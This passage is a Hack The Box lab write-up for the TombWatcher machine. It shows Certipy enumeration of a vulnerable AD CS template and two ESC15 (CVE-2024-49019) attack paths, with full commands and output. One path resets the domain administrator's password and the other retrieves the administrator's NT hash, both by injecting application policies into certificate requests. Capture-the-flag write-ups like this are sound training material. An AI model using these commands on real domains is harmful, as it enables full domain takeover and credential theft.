    Active Policy                       : CertificateAuthority_MicrosoftDefault.Policy
    Permissions
      Owner                             : TOMBWATCHER.HTB\Administrators
      Access Rights
        ManageCa                        : TOMBWATCHER.HTB\Administrators
                                          TOMBWATCHER.HTB\Domain Admins
                                          TOMBWATCHER.HTB\Enterprise Admins
        ManageCertificates              : TOMBWATCHER.HTB\Administrators
                                          TOMBWATCHER.HTB\Domain Admins
                                          TOMBWATCHER.HTB\Enterprise Admins
        Enroll                          : TOMBWATCHER.HTB\Authenticated Users
Certificate Templates
  0
    Template Name                       : WebServer
    Display Name                        : Web Server
    Certificate Authorities             : tombwatcher-CA-1
    Enabled                             : True
    Client Authentication               : False
    Enrollment Agent                    : False
    Any Purpose                         : False
    Enrollee Supplies Subject           : True
    Certificate Name Flag               : EnrolleeSuppliesSubject
    Extended Key Usage                  : Server Authentication
    Requires Manager Approval           : False
    Requires Key Archival               : False
    Authorized Signatures Required      : 0
    Schema Version                      : 1
    Validity Period                     : 2 years
    Renewal Period                      : 6 weeks
    Minimum RSA Key Length              : 2048
    Template Created                    : 2024-11-16T00:57:49+00:00
    Template Last Modified              : 2024-11-16T17:07:26+00:00
    Permissions
      Enrollment Permissions
        Enrollment Rights               : TOMBWATCHER.HTB\Domain Admins
                                          TOMBWATCHER.HTB\Enterprise Admins
                                          TOMBWATCHER.HTB\cert_admin
      Object Control Permissions
        Owner                           : TOMBWATCHER.HTB\Enterprise Admins
        Full Control Principals         : TOMBWATCHER.HTB\Domain Admins
                                          TOMBWATCHER.HTB\Enterprise Admins
        Write Owner Principals          : TOMBWATCHER.HTB\Domain Admins
                                          TOMBWATCHER.HTB\Enterprise Admins
        Write Dacl Principals           : TOMBWATCHER.HTB\Domain Admins
                                          TOMBWATCHER.HTB\Enterprise Admins
        Write Property Enroll           : TOMBWATCHER.HTB\Domain Admins
                                          TOMBWATCHER.HTB\Enterprise Admins
                                          TOMBWATCHER.HTB\cert_admin
    [+] User Enrollable Principals      : TOMBWATCHER.HTB\cert_admin
    [!] Vulnerabilities
      ESC15                             : Enrollee supplies subject and schema version is 1.
    [*] Remarks
      ESC15                             : Only applicable if the environment has not been patched. See CVE-2024-49019 or the wiki for more details.
```

Discovered `ESC15`.
## ESC15

Read about:

https://github.com/ly4k/Certipy/wiki/06-%e2%80%90-Privilege-Escalation#esc15-arbitrary-application-policy-injection-in-v1-templates-cve-2024-49019-ekuwu
### Plan A

**Step 1: Request a certificate, injecting “Client Authentication” Application Policy and target UPN**

```bash
┌──(mdn0x㉿mdn0xKali)-[~/HTB/Machines/TombWatcher/root]
└─$ certipy-ad req \
    -u 'cert_admin@tombwatcher.htb' -p 'Hacker123!' \
    -dc-ip '10.10.11.72' -target 'DC01.tombwatcher.htb' \
    -ca 'tombwatcher-CA-1' -template 'WebServer' \
    -upn 'administrator@tombwatcher.htb'  \
    -application-policies 'Client Authentication'


Certipy v5.0.3 - by Oliver Lyak (ly4k)

[*] Requesting certificate via RPC
[*] Request ID is 9
[*] Successfully requested certificate
[*] Got certificate with UPN 'administrator@tombwatcher.htb'
[*] Certificate has no object SID
[*] Try using -sid to set the object SID or see the wiki for more details
[*] Saving certificate and private key to 'administrator.pfx'
[*] Wrote certificate and private key to 'administrator.pfx'

```

**Step 2: Authenticate via Schannel (LDAPS) using the obtained certificate.**

```bash
┌──(mdn0x㉿mdn0xKali)-[~/HTB/Machines/TombWatcher/root]
└─$ certipy-ad auth -pfx 'administrator.pfx' -dc-ip '10.10.11.72' -ldap-shell
Certipy v5.0.3 - by Oliver Lyak (ly4k)

[*] Certificate identities:
[*]     SAN UPN: 'administrator@tombwatcher.htb'
[*] Connecting to 'ldaps://10.10.11.72:636'
[*] Authenticated to '10.10.11.72' as: 'u:TOMBWATCHER\\Administrator'
Type help for list of commands

# ls
*** Unknown syntax: ls

# change_password administrator Hacker123!
Got User DN: CN=Administrator,CN=Users,DC=tombwatcher,DC=htb
Attempting to set new password of: Hacker123!
Password changed successfully!

# Bye!
```

Then you can log in for the `root` flag:

```powershell
┌──(mdn0x㉿mdn0xKali)-[~/HTB/Machines/TombWatcher/root]
└─$ evil-winrm -i 10.10.11.72 -u administrator -p 'Hacker123!'

*Evil-WinRM* PS C:\Users\Administrator\Documents> cd ..
*Evil-WinRM* PS C:\Users\Administrator> cd Desktop
*Evil-WinRM* PS C:\Users\Administrator\Desktop> type root.txt
  HTB{{REDACTED_FLAG}}
```
### Plan B

**Step 1: Request a certificate from a V1 template (with “Enrollee supplies subject”), injecting “Certificate Request Agent” Application Policy.**

```bash
certipy-ad req \
    -u 'cert_admin@tombwatcher.htb' -p 'Hacker123!' \
    -dc-ip '10.10.11.72' -target 'DC01.tombwatcher.htb' \
    -ca 'tombwatcher-CA-1' -template 'WebServer' \
    -application-policies 'Certificate Request Agent'
```

**Step 2: Use the “agent” certificate to request a certificate on behalf of a target privileged user.**

```bash
certipy-ad req \
    -u 'cert_admin@tombwatcher.htb' -p 'Hacker123!' \
    -dc-ip '10.10.11.72' -target 'DC01.tombwatcher.htb' \
    -ca 'tombwatcher-CA-1' -template 'User' \
    -pfx 'cert_admin.pfx' -on-behalf-of 'tombwatcher\Administrator'
```

**Step 3: Authenticate as the privileged user using the “on-behalf-of” certificate.**

```bash
❯ certipy-ad auth -pfx 'administrator.pfx' -dc-ip '10.10.11.72'
Certipy v5.0.2 - by Oliver Lyak (ly4k)

[*] Certificate identities:
[*]     SAN UPN: 'Administrator@tombwatcher.htb'
[*]     Security Extension SID: 'S-1-5-21-1392491010-1358638721-2126982587-500'
[*] Using principal: 'administrator@tombwatcher.htb'
[*] Trying to get TGT...
[*] Got TGT
[*] Saving credential cache to 'administrator.ccache'
[*] Wrote credential cache to 'administrator.ccache'
[*] Trying to retrieve NT hash for 'administrator'
[*] Got hash for 'administrator@tombwatcher.htb': aad3b435b51404eeaad3b435b51404ee:{{REDACTED_HASH}}
```

if it gives error, use it with `faketime`:

```bash
faketime "$(ntpdate -q 10.10.11.72 | cut -d ' ' -f 1,2)" certipy-ad auth -pfx 'administrator.pfx' -dc-ip '10.10.11.72'
```

Then you can log in with the `hash` using [Evil-WinRM](../../../3%20-%20Tags/Hacking%20Tools/Evil-WinRM.md) with `-H` flag.


Pwned !!